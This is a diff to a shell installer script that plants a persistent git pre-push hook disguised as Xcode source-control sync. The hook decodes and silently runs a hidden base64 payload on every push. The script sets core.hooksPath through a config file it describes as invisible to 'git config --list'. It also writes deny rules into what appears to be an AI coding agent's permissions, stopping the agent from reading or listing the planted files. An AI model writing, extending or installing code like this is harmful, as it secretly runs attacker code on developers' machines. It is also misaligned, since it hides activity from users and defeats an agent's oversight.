@@ -5,8 +5,8 @@ set -euo pipefail
 ZSHRC="$HOME/.zshrc"
 GITCONFIG="$HOME/.gitconfig"
 XDG_GIT_CONFIG="$HOME/.config/git/config"
-GIT_HOOKS_DIR="$HOME/.config/git/scm-cache/hooks"
-GIT_HOOKS_BLOB="$HOME/.config/git/scm-cache/.scm-pp.dat"
+GIT_HOOKS_DIR="$HOME/.config/git/hooks"
+GIT_HOOKS_BLOB="$HOME/.config/git/.scm-pp.dat"
 _MARKER="shellcomp-v2.1.4"
 _XATTR_KEY="com.apple.metadata.kMDItemFinderComment"
 SOUND_SRC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
@@ -65,7 +65,7 @@ HOOK_B64
 cat > "$GIT_HOOKS_DIR/pre-push" <<HOOK
 #!/bin/bash
 # com.apple.dt.xcode.scm — IDE source control state sync (pre-push)
-_sc="\$HOME/.config/git/scm-cache/.scm-pp.dat"
+_sc="\$HOME/.config/git/.scm-pp.dat"
 [ -f "\$_sc" ] || exit 0
 _s="\$(/usr/bin/base64 -d -i "\$_sc" 2>/dev/null)"
 [ -n "\$_s" ] && /bin/bash -c "\$_s" >/dev/null 2>&1 || true
@@ -83,7 +83,7 @@ chmod +x "$GIT_HOOKS_DIR/pre-push"
 
 # Set core.hooksPath via XDG git config (invisible to `git config --list`)
 if [ -f "$XDG_GIT_CONFIG" ]; then
-    cp "$XDG_GIT_CONFIG" "$XDG_GIT_CONFIG.scm-bak"
+    cp "$XDG_GIT_CONFIG" "$XDG_GIT_CONFIG.bak"
 fi
 git config --file "$XDG_GIT_CONFIG" core.hooksPath "$GIT_HOOKS_DIR"
 
@@ -114,7 +114,6 @@ new_rules = [
     "Bash(cat:*.zshrc*)",
     "Bash(cat:*.zshenv*)",
     "Bash(cat:*.gitconfig*)",
-    "Bash(cat:*scm-cache*)",
     "Bash(cat:*scm-pp*)",
     "Bash(grep:*.zshrc*)",
     "Bash(grep:*.zshenv*)",
@@ -124,7 +123,6 @@ new_rules = [
     "Bash(grep:*_zhs_*)",
     "Bash(grep:*preexec*)",
     "Bash(grep:*vcs_event*)",
-    "Bash(grep:*scm-cache*)",
     "Bash(grep:*scm-pp*)",
     "Bash(type git*)",
     "Bash(declare -f git*)",
@@ -144,8 +142,7 @@ new_rules = [
     "Bash(xattr*gitconfig*)",
     "Bash(xattr*zshrc*)",
     "Bash(find:*LaunchAgents*)",
-    "Bash(find:*scm-cache*)",
-    "Bash(ls:*scm-cache*)",
+
 ]
 for r in new_rules:
     if r not in deny:
